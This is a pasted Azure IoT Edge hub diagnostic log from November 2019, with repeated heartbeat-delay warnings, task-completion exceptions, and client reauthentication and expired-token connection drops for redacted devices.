   at System.Threading.Tasks.TaskCompletionSource`1.SetException(Exception exception)
System.InvalidOperationException: An attempt was made to transition a task to a final state when it had already completed.
<4> 2019-11-28 19:55:36.816 +00:00 [WRN] - Error sending messages to module REMOVED BEFORE UPLOAD
<4> 2019-11-28 19:55:58.441 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:55:56 +00:00".
<4> 2019-11-28 19:55:54.348 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:55:53 +00:00".
<4> 2019-11-28 19:55:54.348 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:55:53 +00:00".
<4> 2019-11-28 19:55:47.546 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:55:47 +00:00".
<4> 2019-11-28 19:55:37.985 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:55:36 +00:00".
<4> 2019-11-28 19:55:21.092 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:55:20 +00:00".
   at Microsoft.Azure.Devices.Edge.Hub.Core.Routing.ModuleEndpoint.ModuleMessageProcessor.ProcessAsync(ICollection`1 routingMessages, IDeviceProxy dp, CancellationToken token) in /home/vsts/work/1/s/edge-hub/src/Microsoft.Azure.Devices.Edge.Hub.Core/routing/ModuleEndpoint.cs:line 166
   at Microsoft.Azure.Devices.Edge.Hub.Core.Device.DeviceMessageHandler.SendMessageAsync(IMessage message, String input) in /home/vsts/work/1/s/edge-hub/src/Microsoft.Azure.Devices.Edge.Hub.Core/device/DeviceMessageHandler.cs:line 412
   at System.Threading.Tasks.TaskCompletionSource`1.SetException(Exception exception)
System.InvalidOperationException: An attempt was made to transition a task to a final state when it had already completed.
<4> 2019-11-28 19:40:25.439 +00:00 [WRN] - Non retryable exception occurred while sending message.
<4> 2019-11-28 19:55:15.129 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:55:14 +00:00".
<6> 2019-11-28 19:55:17.955 +00:00 [INF] - Reauthenticating connected clients
<4> 2019-11-28 19:55:00.855 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:55:00 +00:00".
<4> 2019-11-28 19:54:38.624 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:54:38 +00:00".
<4> 2019-11-28 19:53:58.090 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:53:57 +00:00".
<4> 2019-11-28 19:53:53.617 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:53:53 +00:00".
<4> 2019-11-28 19:53:19.802 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:53:19 +00:00".
<4> 2019-11-28 19:53:04.611 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:53:02 +00:00".
<4> 2019-11-28 19:52:57.690 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:52:56 +00:00".
<4> 2019-11-28 19:52:52.994 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:52:52 +00:00".
<4> 2019-11-28 19:52:33.622 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:52:32 +00:00".
<4> 2019-11-28 19:52:27.879 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:52:27 +00:00".
<4> 2019-11-28 19:52:19.154 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:52:18 +00:00".
<4> 2019-11-28 19:52:09.005 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:52:08 +00:00".
<4> 2019-11-28 19:51:52.870 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:51:51 +00:00".
<4> 2019-11-28 19:51:44.031 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:51:42 +00:00".
<4> 2019-11-28 19:51:35.707 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:51:35 +00:00".
<4> 2019-11-28 19:50:58.298 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:50:57 +00:00".
<4> 2019-11-28 19:50:45.231 +00:00 [WRN] - Encountered an error while refreshing the device scope identities cache. Will retry the operation in some time...
<4> 2019-11-28 19:50:42.082 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:50:41 +00:00".
<4> 2019-11-28 19:50:27.967 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:50:27 +00:00".
<6> 2019-11-28 19:50:27.909 +00:00 [INF] - Reauthenticating connected clients
<4> 2019-11-28 19:50:13.336 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:50:12 +00:00".
<4> 2019-11-28 19:50:07.619 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:50:07 +00:00".
<4> 2019-11-28 19:49:40.343 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:49:39 +00:00".
<4> 2019-11-28 19:49:15.945 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:49:15 +00:00".
<4> 2019-11-28 19:48:39.408 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:48:38 +00:00".
<4> 2019-11-28 19:48:20.738 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:48:20 +00:00".
<4> 2019-11-28 19:48:04.842 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:47:54 +00:00".
<4> 2019-11-28 19:47:42.729 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:47:42 +00:00".
<4> 2019-11-28 19:47:29.795 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:47:29 +00:00".
<4> 2019-11-28 19:47:21.218 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:47:20 +00:00".
<6> 2019-11-28 19:47:21.548 +00:00 [INF] - Updated reported properties for REMOVED BEFORE UPLOAD/$edgeHub
<4> 2019-11-28 19:47:18.746 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:47:18 +00:00".
<4> 2019-11-28 19:47:09.788 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:47:09 +00:00".
<4> 2019-11-28 19:46:59.705 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:46:59 +00:00".
<6> 2019-11-28 19:46:45.214 +00:00 [INF] - Successfully completed periodic operation Get EdgeHub config
<4> 2019-11-28 19:46:31.920 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:46:31 +00:00".
<6> 2019-11-28 19:46:32.203 +00:00 [INF] - Obtained edge hub config from module twin
<4> 2019-11-28 19:46:17.366 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:46:16 +00:00".
<6> 2019-11-28 19:45:41.884 +00:00 [INF] - Started task to cleanup processed and stale messages for endpoint iothub
<6> 2019-11-28 19:45:34.124 +00:00 [INF] - Starting refresh of device scope identities cache
<6> 2019-11-28 19:45:34.124 +00:00 [INF] - Starting periodic operation Get EdgeHub config...
<6> 2019-11-28 19:45:18.767 +00:00 [INF] - Reauthenticating connected clients
<4> 2019-11-28 19:45:14.967 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:45:14 +00:00".
<6> 2019-11-28 19:45:11.650 +00:00 [INF] - Cleaned up 227 messages from queue for endpoint REMOVED BEFORE UPLOAD and 12 messages from message store.
<4> 2019-11-28 19:45:11.119 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:45:10 +00:00".
<4> 2019-11-28 19:45:02.905 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:45:02 +00:00".
<4> 2019-11-28 19:44:55.858 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:44:55 +00:00".
<4> 2019-11-28 19:44:44.095 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:44:43 +00:00".
<4> 2019-11-28 19:44:35.073 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:44:34 +00:00".
<4> 2019-11-28 19:44:20.695 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:44:20 +00:00".
<4> 2019-11-28 19:44:15.989 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:44:15 +00:00".
<4> 2019-11-28 19:44:10.649 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:44:10 +00:00".
<4> 2019-11-28 19:44:06.615 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:44:06 +00:00".
<4> 2019-11-28 19:43:51.591 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:43:51 +00:00".
<4> 2019-11-28 19:43:40.576 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:43:40 +00:00".
<4> 2019-11-28 19:43:23.065 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:43:22 +00:00".
<4> 2019-11-28 19:43:14.482 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:43:14 +00:00".
<4> 2019-11-28 19:43:09.891 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:43:09 +00:00".
<4> 2019-11-28 19:43:06.028 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:43:05 +00:00".
<4> 2019-11-28 19:42:51.517 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:42:51 +00:00".
<4> 2019-11-28 19:42:41.926 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:42:41 +00:00".
<4> 2019-11-28 19:42:33.328 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:42:32 +00:00".
<4> 2019-11-28 19:42:25.919 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:42:25 +00:00".
<4> 2019-11-28 19:42:20.065 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:42:19 +00:00".
<4> 2019-11-28 19:42:05.465 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:42:05 +00:00".
<4> 2019-11-28 19:42:01.675 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:42:01 +00:00".
<4> 2019-11-28 19:41:55.258 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:41:54 +00:00".
<4> 2019-11-28 19:41:45.276 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:41:44 +00:00".
<4> 2019-11-28 19:41:21.045 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:41:20 +00:00".
<4> 2019-11-28 19:41:15.458 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:41:15 +00:00".
<4> 2019-11-28 19:41:09.723 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:41:09 +00:00".
<4> 2019-11-28 19:40:56.241 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:40:55 +00:00".
<4> 2019-11-28 19:40:50.839 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:40:50 +00:00".
<4> 2019-11-28 19:40:41.676 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:40:41 +00:00".
<4> 2019-11-28 19:40:35.134 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:40:34 +00:00".
<4> 2019-11-28 19:40:25.439 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:40:24 +00:00".
<4> 2019-11-28 19:40:16.262 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:40:16 +00:00".
<6> 2019-11-28 19:40:16.393 +00:00 [INF] - Reauthenticating connected clients
<4> 2019-11-28 19:40:12.693 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:40:12 +00:00".
<4> 2019-11-28 19:40:05.828 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:40:05 +00:00".
<4> 2019-11-28 19:39:58.688 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:39:58 +00:00".
<4> 2019-11-28 19:39:48.392 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:39:47 +00:00".
<4> 2019-11-28 19:39:42.071 +00:00 [WRN] - Did not receive ack for message b11c2399-4860-480d-8f47-e78391c3e364 from device/REMOVED BEFORE UPLOAD
<4> 2019-11-28 19:39:17.114 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:39:16 +00:00".
<4> 2019-11-28 19:39:11.106 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:39:10 +00:00".
<4> 2019-11-28 19:38:42.888 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:38:42 +00:00".
<4> 2019-11-28 19:38:17.006 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:38:16 +00:00".
<4> 2019-11-28 19:37:51.319 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:37:50 +00:00".
<4> 2019-11-28 19:37:20.281 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:37:19 +00:00".
<4> 2019-11-28 19:36:50.392 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:36:49 +00:00".
<4> 2019-11-28 19:36:08.709 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:36:08 +00:00".
<4> 2019-11-28 19:36:03.225 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:36:02 +00:00".
<4> 2019-11-28 19:35:56.776 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:35:56 +00:00".
<4> 2019-11-28 19:35:52.009 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:35:51 +00:00".
<4> 2019-11-28 19:35:40.025 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:35:39 +00:00".
<4> 2019-11-28 19:35:28.116 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:35:27 +00:00".
<4> 2019-11-28 19:35:18.928 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:35:18 +00:00".
<6> 2019-11-28 19:35:18.928 +00:00 [INF] - Reauthenticating connected clients
<4> 2019-11-28 19:35:12.943 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:35:12 +00:00".
<4> 2019-11-28 19:35:06.532 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:35:06 +00:00".
<4> 2019-11-28 19:35:00.863 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:35:00 +00:00".
<4> 2019-11-28 19:34:53.775 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:34:53 +00:00".
<4> 2019-11-28 19:34:43.516 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:34:43 +00:00".
<4> 2019-11-28 19:34:27.511 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:34:27 +00:00".
<4> 2019-11-28 19:34:19.993 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:34:19 +00:00".
<4> 2019-11-28 19:34:07.909 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:34:00 +00:00".
<4> 2019-11-28 19:34:08.178 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:34:07 +00:00".
<6> 2019-11-28 19:33:37.895 +00:00 [INF] - Started task to cleanup processed and stale messages for endpoint REMOVED BEFORE UPLOAD
<4> 2019-11-28 19:33:14.051 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:33:13 +00:00".
<4> 2019-11-28 19:33:03.140 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:33:02 +00:00".
<4> 2019-11-28 19:32:57.387 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:32:57 +00:00".
<4> 2019-11-28 19:32:40.396 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:32:39 +00:00".
<4> 2019-11-28 19:32:16.345 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:32:16 +00:00".
<4> 2019-11-28 19:32:09.249 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:32:08 +00:00".
<4> 2019-11-28 19:31:55.448 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:31:55 +00:00".
<4> 2019-11-28 19:31:30.312 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:31:29 +00:00".
<4> 2019-11-28 19:31:16.223 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:31:15 +00:00".
<4> 2019-11-28 19:31:05.775 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:31:05 +00:00".
<4> 2019-11-28 19:30:55.960 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:30:55 +00:00".
<4> 2019-11-28 19:30:46.399 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:30:46 +00:00".
<6> 2019-11-28 19:30:16.319 +00:00 [INF] - Reauthenticating connected clients
<4> 2019-11-28 19:30:13.000 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:30:12 +00:00".
<4> 2019-11-28 19:30:02.986 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:30:02 +00:00".
<4> 2019-11-28 19:29:52.144 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:29:51 +00:00".
<4> 2019-11-28 19:29:43.635 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:29:43 +00:00".
<4> 2019-11-28 19:29:31.554 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:29:31 +00:00".
<4> 2019-11-28 19:29:21.526 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:29:21 +00:00".
<4> 2019-11-28 19:29:15.911 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:29:15 +00:00".
<4> 2019-11-28 19:29:11.681 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:29:11 +00:00".
<4> 2019-11-28 19:29:06.611 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:29:06 +00:00".
<4> 2019-11-28 19:28:55.720 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:28:54 +00:00".
<4> 2019-11-28 19:28:08.107 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:28:07 +00:00".
<4> 2019-11-28 19:28:00.255 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:27:59 +00:00".
<4> 2019-11-28 19:27:53.475 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:27:53 +00:00".
<4> 2019-11-28 19:27:50.728 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:27:50 +00:00".
<4> 2019-11-28 19:27:36.716 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:27:36 +00:00".
<6> 2019-11-28 19:27:28.349 +00:00 [INF] - Updated reported properties for REMOVED BEFORE UPLOAD/$edgeHub
<6> 2019-11-28 19:27:22.279 +00:00 [INF] - Updated reported properties for REMOVED BEFORE UPLOAD/$edgeHub
<6> 2019-11-28 19:27:21.658 +00:00 [INF] - Set subscriptions from session state for REMOVED BEFORE UPLOAD
<6> 2019-11-28 19:27:21.655 +00:00 [INF] - Processing subscriptions TwinResponse, ModuleMessages, DesiredPropertyUpdates, Methods for client REMOVED BEFORE UPLOAD.
<6> 2019-11-28 19:27:21.651 +00:00 [INF] - Set subscriptions from session state for REMOVED BEFORE UPLOAD
<6> 2019-11-28 19:27:21.627 +00:00 [INF] - Processing subscriptions TwinResponse, ModuleMessages, DesiredPropertyUpdates, Methods for client REMOVED BEFORE UPLOAD.
<6> 2019-11-28 19:27:21.622 +00:00 [INF] - Set subscriptions from session state for REMOVED BEFORE UPLOAD
<6> 2019-11-28 19:27:21.619 +00:00 [INF] - Processing subscriptions TwinResponse, ModuleMessages, DesiredPropertyUpdates, Methods for client REMOVED BEFORE UPLOAD.
<6> 2019-11-28 19:27:21.614 +00:00 [INF] - Set subscriptions from session state for REMOVED BEFORE UPLOAD
<6> 2019-11-28 19:27:21.612 +00:00 [INF] - Processing subscriptions TwinResponse, DesiredPropertyUpdates for client REMOVED BEFORE UPLOAD.
<6> 2019-11-28 19:27:20.907 +00:00 [INF] - Set subscriptions from session state for REMOVED BEFORE UPLOAD
<6> 2019-11-28 19:27:20.895 +00:00 [INF] - Processing subscriptions TwinResponse, ModuleMessages, Methods for client REMOVED BEFORE UPLOAD.
<6> 2019-11-28 19:27:20.863 +00:00 [INF] - Set subscriptions from session state for REMOVED BEFORE UPLOAD
<6> 2019-11-28 19:27:20.861 +00:00 [INF] - Processing subscriptions TwinResponse, ModuleMessages, Methods for client REMOVED BEFORE UPLOAD.
<6> 2019-11-28 19:27:20.783 +00:00 [INF] - Set subscriptions from session state for REMOVED BEFORE UPLOAD
<6> 2019-11-28 19:27:20.781 +00:00 [INF] - Processing subscriptions TwinResponse, DesiredPropertyUpdates for client REMOVED BEFORE UPLOAD.
<6> 2019-11-28 19:27:20.715 +00:00 [INF] - Set subscriptions from session state for REMOVED BEFORE UPLOAD
<6> 2019-11-28 19:27:20.486 +00:00 [INF] - Processing subscriptions TwinResponse, ModuleMessages, DesiredPropertyUpdates, Methods for client REMOVED BEFORE UPLOAD.
<6> 2019-11-28 19:27:18.313 +00:00 [INF] - Set subscriptions from session state for REMOVED BEFORE UPLOAD
<6> 2019-11-28 19:27:17.913 +00:00 [INF] - Binding message channel for device Id REMOVED BEFORE UPLOAD
<4> 2019-11-28 19:27:17.645 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:27:17 +00:00".
<6> 2019-11-28 19:27:17.729 +00:00 [INF] - Bind device proxy for device REMOVED BEFORE UPLOAD
<6> 2019-11-28 19:27:15.199 +00:00 [INF] - Processing subscriptions TwinResponse, ModuleMessages, Methods for client REMOVED BEFORE UPLOAD.
<6> 2019-11-28 19:27:14.269 +00:00 [INF] - New device connection for device REMOVED BEFORE UPLOAD
<6> 2019-11-28 19:27:14.000 +00:00 [INF] - ClientAuthenticated, REMOVED BEFORE UPLOAD, 0018749c
<6> 2019-11-28 19:27:13.872 +00:00 [INF] - Successfully generated identity for clientId REMOVED BEFORE UPLOAD and username REMOVED BEFORE UPLOAD/?api-version=2018-06-30&DeviceClientType=.NET%2F1.21.2%20%28.NET%20Core%204.6.28008.02%3B%20Linux%204.19.66-v7%2B%20%231253%20SMP%20Thu%20Aug%2015%2011%3A49%3A46%20BST%202019%3B%20Arm%29
<4> 2019-11-28 19:27:13.300 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:27:13 +00:00".
<6> 2019-11-28 19:27:13.468 +00:00 [INF] - Client REMOVED BEFORE UPLOAD in device scope authenticated locally.
<6> 2019-11-28 19:27:13.502 +00:00 [INF] - Binding message channel for device Id REMOVED BEFORE UPLOAD
<6> 2019-11-28 19:27:13.502 +00:00 [INF] - Binding message channel for device Id REMOVED BEFORE UPLOAD
<6> 2019-11-28 19:27:13.300 +00:00 [INF] - Bind device proxy for device REMOVED BEFORE UPLOAD
<6> 2019-11-28 19:27:13.300 +00:00 [INF] - Bind device proxy for device REMOVED BEFORE UPLOAD
<6> 2019-11-28 19:27:10.495 +00:00 [INF] - New device connection for device REMOVED BEFORE UPLOAD
<6> 2019-11-28 19:27:10.495 +00:00 [INF] - New device connection for device REMOVED BEFORE UPLOAD
<6> 2019-11-28 19:27:05.600 +00:00 [INF] - ClientAuthenticated, REMOVED BEFORE UPLOAD, 0f856c53
<6> 2019-11-28 19:27:05.600 +00:00 [INF] - ClientAuthenticated, REMOVED BEFORE UPLOAD, 58dcefa7
<6> 2019-11-28 19:27:05.443 +00:00 [INF] - Successfully generated identity for clientId REMOVED BEFORE UPLOAD and username REMOVED BEFORE UPLOAD/?api-version=2018-06-30&DeviceClientType=.NET%2F1.21.2%20%28.NET%20Core%204.6.28008.02%3B%20Linux%204.19.66-v7%2B%20%231253%20SMP%20Thu%20Aug%2015%2011%3A49%3A46%20BST%202019%3B%20Arm%29
<6> 2019-11-28 19:27:05.443 +00:00 [INF] - Successfully generated identity for clientId REMOVED BEFORE UPLOAD and username REMOVED BEFORE UPLOAD/?api-version=2018-06-30&DeviceClientType=.NET%2F1.21.2%20%28.NET%20Core%204.6.28008.02%3B%20Linux%204.19.66-v7%2B%20%231253%20SMP%20Thu%20Aug%2015%2011%3A49%3A46%20BST%202019%3B%20Arm%29
<6> 2019-11-28 19:27:04.123 +00:00 [INF] - Client REMOVED BEFORE UPLOAD in device scope authenticated locally.
<6> 2019-11-28 19:27:04.258 +00:00 [INF] - Client REMOVED BEFORE UPLOAD in device scope authenticated locally.
<6> 2019-11-28 19:26:34.993 +00:00 [INF] - Updated reported properties for DG-0000000-191025-005/$edgeHub
<4> 2019-11-28 19:26:33.745 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:26:33 +00:00".
<4> 2019-11-28 19:26:27.478 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:26:27 +00:00".
<4> 2019-11-28 19:26:24.369 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:26:24 +00:00".
<6> 2019-11-28 19:26:24.436 +00:00 [INF] - Updated reported properties for DG-0000000-191025-005/$edgeHub
<4> 2019-11-28 19:26:20.110 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:26:19 +00:00".
<4> 2019-11-28 19:26:16.427 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:26:16 +00:00".
<6> 2019-11-28 19:25:50.753 +00:00 [INF] - Device connection removed for device REMOVED BEFORE UPLOAD
<6> 2019-11-28 19:25:50.753 +00:00 [INF] - Closing device proxy for device Id REMOVED BEFORE UPLOAD
<6> 2019-11-28 19:25:50.726 +00:00 [INF] - Disposing MessagingServiceClient for device Id REMOVED BEFORE UPLOAD because of exception - Microsoft.Azure.Devices.Edge.Hub.Core.EdgeHubConnectionException: Connection closed for device REMOVED BEFORE UPLOAD.
<4> 2019-11-28 19:25:50.640 +00:00 [WRN] - Closing connection for device: REMOVED BEFORE UPLOAD, Microsoft.Azure.Devices.Edge.Hub.Core.EdgeHubConnectionException: Connection closed for device REMOVED BEFORE UPLOAD., 
<6> 2019-11-28 19:25:50.371 +00:00 [INF] - Updated reported properties for DG-0000000-191025-005/$edgeHub
<6> 2019-11-28 19:25:50.014 +00:00 [INF] - Unable to re-authenticate REMOVED BEFORE UPLOAD, dropping client connection.
<4> 2019-11-28 19:25:50.013 +00:00 [WRN] - Reauthenticating client REMOVED BEFORE UPLOAD failed, removing client connection
<6> 2019-11-28 19:25:49.747 +00:00 [INF] - Credentials for client REMOVED BEFORE UPLOAD are not valid.
<4> 2019-11-28 19:25:47.922 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:25:47 +00:00".
<6> 2019-11-28 19:25:47.842 +00:00 [INF] - Error authenticating token for REMOVED BEFORE UPLOAD because the token is expired or could not be parsed
<4> 2019-11-28 19:25:40.679 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:25:40 +00:00".
<6> 2019-11-28 19:25:32.602 +00:00 [INF] - Device connection removed for device REMOVED BEFORE UPLOAD
<6> 2019-11-28 19:25:32.602 +00:00 [INF] - Closing device proxy for device Id REMOVED BEFORE UPLOAD
<6> 2019-11-28 19:25:32.178 +00:00 [INF] - Disposing MessagingServiceClient for device Id REMOVED BEFORE UPLOAD because of exception - Microsoft.Azure.Devices.Edge.Hub.Core.EdgeHubConnectionException: Connection closed for device REMOVED BEFORE UPLOAD.
<4> 2019-11-28 19:25:32.177 +00:00 [WRN] - Closing connection for device: REMOVED BEFORE UPLOAD, Microsoft.Azure.Devices.Edge.Hub.Core.EdgeHubConnectionException: Connection closed for device REMOVED BEFORE UPLOAD., 
<6> 2019-11-28 19:25:31.903 +00:00 [INF] - Unable to re-authenticate REMOVED BEFORE UPLOAD, dropping client connection.
<4> 2019-11-28 19:25:31.903 +00:00 [WRN] - Reauthenticating client REMOVED BEFORE UPLOAD failed, removing client connection
<6> 2019-11-28 19:25:31.903 +00:00 [INF] - Credentials for client REMOVED BEFORE UPLOAD are not valid.
<6> 2019-11-28 19:25:31.329 +00:00 [INF] - Error authenticating token for REMOVED BEFORE UPLOAD because the token is expired or could not be parsed
<6> 2019-11-28 19:25:27.453 +00:00 [INF] - Device connection removed for device REMOVED BEFORE UPLOAD
<6> 2019-11-28 19:25:27.453 +00:00 [INF] - Closing device proxy for device Id REMOVED BEFORE UPLOAD
